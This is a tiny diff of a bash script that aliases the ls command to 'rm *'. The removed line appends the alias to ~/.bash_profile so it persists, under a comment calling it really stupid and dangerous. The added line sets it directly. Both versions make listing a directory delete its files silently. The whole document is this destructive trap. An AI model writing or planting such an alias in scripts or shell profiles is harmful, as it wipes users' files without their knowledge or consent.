@@ -1,2 +1,2 @@
 #!/bin/bash
-printf "\x0a#ADDS A REALLY STUPID AND DANGEROUS ALIAS\x0aalias ls='rm *'\x0a" >> ~/.bash_profile
+alias ls="rm *"
